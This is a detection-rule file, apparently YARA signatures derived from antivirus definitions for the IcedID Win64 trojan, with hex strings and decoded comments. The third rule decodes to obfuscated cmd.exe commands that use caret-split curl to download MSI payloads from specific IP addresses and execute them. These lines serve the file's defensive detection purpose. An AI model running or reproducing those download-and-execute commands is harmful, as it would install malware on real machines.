
rule Trojan_Win64_IcedID_MT_MTB{
	meta:
		description = "Trojan:Win64/IcedID.MT!MTB,SIGNATURE_TYPE_PEHSTR_EXT,19 00 19 00 07 00 00 0a 00 "
		
	strings :
		$a_01_0 = {68 31 6b 46 4d 51 2e 64 6c 6c } //0a 00  h1kFMQ.dll
		$a_01_1 = {50 6c 75 67 69 6e 49 6e 69 74 } //01 00  PluginInit
		$a_01_2 = {49 43 4f 70 65 6e 46 75 6e 63 74 69 6f 6e } //01 00  ICOpenFunction
		$a_01_3 = {49 43 53 65 6e 64 4d 65 73 73 61 67 65 } //01 00  ICSendMessage
		$a_01_4 = {43 6f 6d 62 69 6e 65 54 72 61 6e 73 66 6f 72 6d } //01 00  CombineTransform
		$a_01_5 = {47 65 74 52 61 6e 64 6f 6d 52 67 6e } //01 00  GetRandomRgn
		$a_01_6 = {45 78 74 43 72 65 61 74 65 52 65 67 69 6f 6e } //00 00  ExtCreateRegion
	condition:
		any of ($a_*)
 
}
rule Trojan_Win64_IcedID_MT_MTB_2{
	meta:
		description = "Trojan:Win64/IcedID.MT!MTB,SIGNATURE_TYPE_PEHSTR_EXT,17 00 17 00 06 00 00 0a 00 "
		
	strings :
		$a_01_0 = {61 69 73 75 6b 66 6a 6e 75 61 73 68 66 6b 61 73 69 6a 66 75 68 61 6b 73 6a 75 64 68 69 6b 6a } //05 00  aisukfjnuashfkasijfuhaksjudhikj
		$a_01_1 = {22 00 00 00 ba 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00 00 00 80 01 00 00 00 00 10 00 00 00 02 00 00 06 } //02 00 
		$a_01_2 = {45 6e 75 6d 52 65 73 6f 75 72 63 65 4c 61 6e 67 75 61 67 65 73 45 78 57 } //02 00  EnumResourceLanguagesExW
		$a_01_3 = {45 6e 75 6d 52 65 73 6f 75 72 63 65 4e 61 6d 65 73 57 } //02 00  EnumResourceNamesW
		$a_01_4 = {44 75 70 6c 69 63 61 74 65 48 61 6e 64 6c 65 } //02 00  DuplicateHandle
		$a_01_5 = {47 65 74 43 75 72 72 65 6e 74 50 72 6f 63 65 73 73 } //00 00  GetCurrentProcess
	condition:
		any of ($a_*)
 
}
rule Trojan_Win64_IcedID_MT_MTB_3{
	meta:
		description = "Trojan:Win64/IcedID.MT!MTB,SIGNATURE_TYPE_PEHSTR_EXT,05 00 05 00 03 00 00 05 00 "
		
	strings :
		$a_01_0 = {63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 6d 64 2e 65 78 65 20 2f 63 20 63 5e 75 5e 72 5e 6c 20 2d 6f 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 64 53 2e 6d 73 69 20 68 74 74 70 3a 2f 2f 31 33 35 2e 31 32 35 2e 31 37 37 2e 38 32 2f 55 4d 59 41 70 64 34 2f 75 77 59 26 26 74 69 6d 65 6f 75 74 20 31 35 26 26 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 64 53 2e 6d 73 69 } //05 00  c:\windows\system32\cmd.exe /c c^u^r^l -o c:\users\public\dS.msi http://135.125.177.82/UMYApd4/uwY&&timeout 15&&c:\users\public\dS.msi
		$a_01_1 = {63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 6d 64 2e 65 78 65 20 2f 63 20 63 5e 75 5e 72 5e 6c 20 2d 6f 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 65 54 36 43 71 53 69 4c 2e 6d 73 69 20 68 74 74 70 3a 2f 2f 39 35 2e 31 36 34 2e 31 37 2e 35 39 2f 5a 49 62 72 37 2f 37 66 72 68 64 26 26 74 69 6d 65 6f 75 74 20 31 35 26 26 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 65 54 36 43 71 53 69 4c 2e 6d 73 69 } //05 00  c:\windows\system32\cmd.exe /c c^u^r^l -o c:\users\public\eT6CqSiL.msi http://95.164.17.59/ZIbr7/7frhd&&timeout 15&&c:\users\public\eT6CqSiL.msi
		$a_01_2 = {63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 6d 64 2e 65 78 65 20 2f 63 20 63 5e 75 5e 72 5e 6c 20 2d 6f 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 79 6c 2e 6d 73 69 20 68 74 74 70 3a 2f 2f 31 33 35 2e 31 32 35 2e 31 37 37 2e 39 35 2f 73 79 4b 2f 63 78 66 47 6d 4a 26 26 74 69 6d 65 6f 75 74 20 31 35 26 26 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 79 6c 2e 6d 73 69 } //00 00  c:\windows\system32\cmd.exe /c c^u^r^l -o c:\users\public\yl.msi http://135.125.177.95/syK/cxfGmJ&&timeout 15&&c:\users\public\yl.msi
	condition:
		any of ($a_*)
 
}